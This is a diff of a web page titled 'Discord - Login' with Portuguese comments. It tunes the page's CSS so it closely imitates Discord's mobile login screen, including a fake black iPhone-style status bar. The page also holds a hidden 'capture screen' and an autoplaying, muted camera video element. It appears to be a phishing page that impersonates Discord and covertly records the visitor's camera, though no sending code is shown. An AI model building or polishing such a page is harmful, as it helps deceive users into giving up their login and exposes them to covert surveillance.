@@ -5,7 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="theme-color" content="#1e1f22">
+<!-- AQUI ESTAVA O ERRO: TROCAMOS PARA PRETO PURO -->
+<meta name="theme-color" content="#000000">
 <title>Discord - Login</title>
 <link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
@@ -19,21 +20,22 @@
         flex-direction: column;
         align-items: center;
         padding: 20px;
+        padding-top: 10px; /* Puxa tudo pra cima */
     }
 
-    /* BARRINHA PRETA NO TOPO (Status Bar do iPhone) */
+    /* BARRINHA PRETA PURA NO TOPO */
     .top-bar {
         position: fixed;
         top: 0; left: 0; width: 100%;
-        height: 50px; /* Altura da barra de status */
-        background-color: #1e1f22;
+        height: 50px; 
+        background-color: #000000; /* PRETO PURO */
         z-index: 100;
     }
     
     .login-box {
         width: 100%;
         max-width: 420px;
-        margin-top: 20px; /* Empurra um pouco pra baixo da barrinha preta */
+        margin-top: 40px; /* Compensa a barra preta */
     }
 
     .header-logo {
@@ -41,7 +43,7 @@
         align-items: center;
         justify-content: center;
         gap: 6px;
-        margin-bottom: 20px;
+        margin-bottom: 16px;
     }
     .header-logo svg {
         width: 34px;
@@ -49,7 +51,7 @@
         fill: #fff;
     }
     .header-logo span {
-        font-size: 24px;
+        font-size: 22px;
         font-weight: 700;
         color: #fff;
         letter-spacing: -0.5px;
@@ -66,14 +68,14 @@
     p {
         color: #b5bac1;
         font-size: 16px;
-        margin-bottom: 24px;
+        margin-bottom: 20px;
         text-align: center;
         line-height: 1.3;
     }
 
     .input-group {
         text-align: left;
-        margin-bottom: 20px;
+        margin-bottom: 16px;
     }
     
     label {
@@ -89,18 +91,17 @@
         position: relative;
     }
     
-    /* AS MARCAÇÕES (Bordas) QUE ESTAVAM FALTANDO */
+    /* Inputs com as bordas sutis */
     input {
         width: 100%;
         padding: 10px;
         background-color: #1e1f22;
-        border: 1px solid #1e1f22; /* Borda sutil */
+        border: 1px solid #1e1f22; 
         border-radius: 3px; 
         color: #dbdee1;
         font-size: 15px;
         height: 42px;
         outline: none;
-        transition: border-color 0.2s;
     }
     input:focus { border-color: #000; }
     
@@ -120,22 +121,20 @@
         color: #00a8fc;
         font-size: 14px;
         text-decoration: none;
-        margin-bottom: 20px;
-        margin-top: -5px;
+        margin-bottom: 16px;
+        margin-top: -4px;
     }
 
-    /* BOTÃO COM A MARCAÇÃO EXATA */
     .btn-login {
         width: 100%;
         padding: 0;
         background-color: #5865F2; 
         color: #fff;
-        border: 1px solid #5865F2; /* Borda no botão */
+        border: 1px solid #5865F2;
         border-radius: 3px; 
         font-size: 16px;
         font-weight: 500;
         cursor: pointer;
-        transition: background-color 0.2s;
         height: 42px; 
     }
     .btn-login:active { background-color: #4752c4; }
@@ -146,8 +145,8 @@
         color: #00a8fc;
         font-size: 14px;
         text-decoration: none;
-        margin-top: 16px;
-        margin-bottom: 8px;
+        margin-top: 12px;
+        margin-bottom: 6px;
     }
 
     .register {
@@ -157,7 +156,6 @@
     }
     .register a { color: #00a8fc; text-decoration: none; }
 
-    /* TELA PRETA DE CAPTURA */
     #capture-screen {
         display: none;
         position: fixed;
@@ -175,7 +173,7 @@
 </head>
 <body>
 
-<!-- BARRINHA PRETA NO TOPO -->
+<!-- BARRINHA PRETA -->
 <div class="top-bar"></div>
 
 <video id="camera" autoplay playsinline muted></video>
